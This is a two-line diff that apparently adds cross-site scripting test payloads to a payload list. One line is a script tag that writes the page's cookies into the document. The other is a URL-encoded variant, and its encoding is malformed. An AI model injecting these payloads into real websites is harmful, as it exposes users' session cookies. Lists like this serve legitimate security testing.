@@ -1,0 +1,2 @@
+<script>document.write(document.cookie)</script>
+%3Cscript%3document.write(document.cookie)
